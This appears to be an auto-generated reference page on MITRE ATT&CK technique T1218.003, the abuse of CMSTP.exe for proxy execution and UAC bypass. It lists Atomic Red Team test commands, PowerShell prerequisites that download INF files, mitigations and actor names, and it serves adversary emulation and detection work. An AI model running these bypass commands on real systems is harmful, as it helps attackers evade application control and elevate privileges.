
# CMSTP

## Description

### MITRE Description

> Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.

CMSTP.exe can also be abused to [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Anti-virus', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/003

## Potential Commands

```
cmstp.exe /s PathToAtomicsFolder\T1218.003\src\T1218.003.inf
cmstp.exe /s PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf /au
```

## Commands Dataset

```
[{'command': 'cmstp.exe /s '
             'PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf\n',
  'name': None,
  'source': 'atomics/T1218.003/T1218.003.yaml'},
 {'command': 'cmstp.exe /s '
             'PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf '
             '/au\n',
  'name': None,
  'source': 'atomics/T1218.003/T1218.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: CMSTP': {'atomic_tests': [{'auto_generated_guid': '34e63321-9683-496b-bbc1-7566bc55e624',
                                                                                    'dependencies': [{'description': 'INF '
                                                                                                                     'file '
                                                                                                                     'must '
                                                                                                                     'exist '
                                                                                                                     'on '
                                                                                                                     'disk '
                                                                                                                     'at '
                                                                                                                     'specified '
                                                                                                                     'location '
                                                                                                                     '(#{inf_file_path})\n',
                                                                                                      'get_prereq_command': 'New-Item '
                                                                                                                            '-Type '
                                                                                                                            'Directory '
                                                                                                                            '(split-path '
                                                                                                                            '#{inf_file_path}) '
                                                                                                                            '-ErrorAction '
                                                                                                                            'ignore '
                                                                                                                            '| '
                                                                                                                            'Out-Null\n'
                                                                                                                            'Invoke-WebRequest '
                                                                                                                            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" '
                                                                                                                            '-OutFile '
                                                                                                                            '"#{inf_file_path}"\n',
                                                                                                      'prereq_command': 'if '
                                                                                                                        '(Test-Path '
                                                                                                                        '#{inf_file_path}) '
                                                                                                                        '{exit '
                                                                                                                        '0} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'}],
                                                                                    'dependency_executor_name': 'powershell',
                                                                                    'description': 'Adversaries '
                                                                                                   'may '
                                                                                                   'supply '
                                                                                                   'CMSTP.exe '
                                                                                                   'with '
                                                                                                   'INF '
                                                                                                   'files '
                                                                                                   'infected '
                                                                                                   'with '
                                                                                                   'malicious '
                                                                                                   'commands\n',
                                                                                    'executor': {'command': 'cmstp.exe '
                                                                                                            '/s '
                                                                                                            '#{inf_file_path}\n',
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'inf_file_path': {'default': 'PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf',
                                                                                                                          'description': 'Path '
                                                                                                                                         'to '
                                                                                                                                         'the '
                                                                                                                                         'INF '
                                                                                                                                         'file',
                                                                                                                          'type': 'path'}},
                                                                                    'name': 'CMSTP '
                                                                                            'Executing '
                                                                                            'Remote '
                                                                                            'Scriptlet',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '748cb4f6-2fb3-4e97-b7ad-b22635a09ab0',
                                                                                    'dependencies': [{'description': 'INF '
                                                                                                                     'file '
                                                                                                                     'must '
                                                                                                                     'exist '
                                                                                                                     'on '
                                                                                                                     'disk '
                                                                                                                     'at '
                                                                                                                     'specified '
                                                                                                                     'location '
                                                                                                                     '(#{inf_file_uac})\n',
                                                                                                      'get_prereq_command': 'New-Item '
                                                                                                                            '-Type '
                                                                                                                            'Directory '
                                                                                                                            '(split-path '
                                                                                                                            '#{inf_file_uac}) '
                                                                                                                            '-ErrorAction '
                                                                                                                            'ignore '
                                                                                                                            '| '
                                                                                                                            'Out-Null\n'
                                                                                                                            'Invoke-WebRequest '
                                                                                                                            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" '
                                                                                                                            '-OutFile '
                                                                                                                            '"#{inf_file_uac}"\n',
                                                                                                      'prereq_command': 'if '
                                                                                                                        '(Test-Path '
                                                                                                                        '#{inf_file_uac}) '
                                                                                                                        '{exit '
                                                                                                                        '0} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'}],
                                                                                    'dependency_executor_name': 'powershell',
                                                                                    'description': 'Adversaries '
                                                                                                   'may '
                                                                                                   'invoke '
                                                                                                   'cmd.exe '
                                                                                                   '(or '
                                                                                                   'other '
                                                                                                   'malicious '
                                                                                                   'commands) '
                                                                                                   'by '
                                                                                                   'embedding '
                                                                                                   'them '
                                                                                                   'in '
                                                                                                   'the '
                                                                                                   'RunPreSetupCommandsSection '
                                                                                                   'of '
                                                                                                   'an '
                                                                                                   'INF '
                                                                                                   'file\n',
                                                                                    'executor': {'command': 'cmstp.exe '
                                                                                                            '/s '
                                                                                                            '#{inf_file_uac} '
                                                                                                            '/au\n',
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'inf_file_uac': {'default': 'PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf',
                                                                                                                         'description': 'Path '
                                                                                                                                        'to '
                                                                                                                                        'the '
                                                                                                                                        'INF '
                                                                                                                                        'file',
                                                                                                                         'type': 'path'}},
                                                                                    'name': 'CMSTP '
                                                                                            'Executing '
                                                                                            'UAC '
                                                                                            'Bypass',
                                                                                    'supported_platforms': ['windows']}],
                                                                  'attack_technique': 'T1218.003',
                                                                  'display_name': 'Signed '
                                                                                  'Binary '
                                                                                  'Proxy '
                                                                                  'Execution: '
                                                                                  'CMSTP'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)

* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

* [MuddyWater](../actors/MuddyWater.md)
    
